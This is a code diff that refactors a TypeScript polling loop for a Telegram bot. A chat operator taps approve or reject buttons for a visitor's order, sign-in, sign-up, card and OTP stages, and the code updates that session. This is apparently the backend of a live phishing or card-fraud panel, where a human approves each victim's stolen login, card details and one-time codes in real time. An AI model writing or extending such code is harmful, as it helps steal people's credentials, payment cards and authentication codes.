@@ -109,33 +109,54 @@ ${payload.summary || ''}`
 }
 
 async function tgPoll() {
-  const offset = lastOffset || parseInt(localStorage.getItem('tg_offset') || '0', 10)
-  const r = await tgCall('getUpdates', { offset, timeout: 30, allowed_updates: ['callback_query'] })
-  if (!r || !r.ok || !r.result?.length) return
-  
-  for (const u of r.result) {
-    lastOffset = u.update_id + 1
-    localStorage.setItem('tg_offset', String(lastOffset))
+  try {
+    const offset = lastOffset || parseInt(localStorage.getItem('tg_offset') || '0', 10)
+    const r = await tgCall('getUpdates', { offset, timeout: 30, allowed_updates: ['callback_query'] })
+    if (!r || !r.ok || !r.result?.length) return
     
-    const cq = u.callback_query
-    if (!cq?.message?.chat?.id || String(cq.message.chat.id) !== TG_CHAT) continue
-    
-    const [action, id] = (cq.data || '').split(':')
-    const updated = updateSession(id, { stage: action?.replace('approve_', 'approved').replace('reject_', 'rejected') })
-    
-    if (updated) {
-      await tgCall('answerCallbackQuery', { callback_query_id: cq.id, text: (action?.split('_')[0] || '') + 'd' })
-      await tgCall('editMessageReplyMarkup', {
-        chat_id: cq.message.chat.id,
-        message_id: cq.message.message_id,
-        reply_markup: { inline_keyboard: [[{ text: '✓ ' + (action?.split('_')[0]?.toUpperCase() || '') + 'D', callback_data: 'noop' }]] }
+    for (const u of r.result) {
+      lastOffset = u.update_id + 1
+      localStorage.setItem('tg_offset', String(lastOffset))
+      
+      const cq = u.callback_query
+      if (!cq?.message?.chat?.id || String(cq.message.chat.id) !== TG_CHAT) continue
+      
+      const data = cq.data || ''
+      const match = data.match(/^(approve|reject)_(order|signin|signup|card|otp):(.+)$/)
+      if (!match) {
+        await tgCall('answerCallbackQuery', { callback_query_id: cq.id })
+        continue
+      }
+      
+      const [, action, kind, sessionId] = match
+      // Update session
+      const updated = updateSession(sessionId, { 
+        stage: action === 'approve' ? `${kind}_approved` : `${kind}_rejected` 
       })
-      handleUpdate(id, updated.stage)
+      
+      if (updated) {
+        await tgCall('answerCallbackQuery', { 
+          callback_query_id: cq.id, 
+          text: action === 'approve' ? 'APPROVED!' : 'REJECTED' 
+        })
+        await tgCall('editMessageReplyMarkup', {
+          chat_id: cq.message.chat.id,
+          message_id: cq.message.message_id,
+          reply_markup: { inline_keyboard: [[{ text: '✓ ' + kind.toUpperCase(), callback_data: 'noop' }]] }
+        })
+        handleUpdate(sessionId, updated.stage)
+      } else {
+        await tgCall('answerCallbackQuery', { callback_query_id: cq.id })
+      }
     }
+  } catch (e) {
+    console.warn('tgPoll error:', e)
   }
 }
 
-setInterval(tgPoll, 3000)
+// Run polling immediately and then every 3 seconds
+tgPoll()
+setInterval(() => { tgPoll().catch(() => {}) }, 3000)
 
 function handleUpdate(sessionId: string, stage: string) {
   console.log(`Session ${sessionId} updated to stage: ${stage}`)
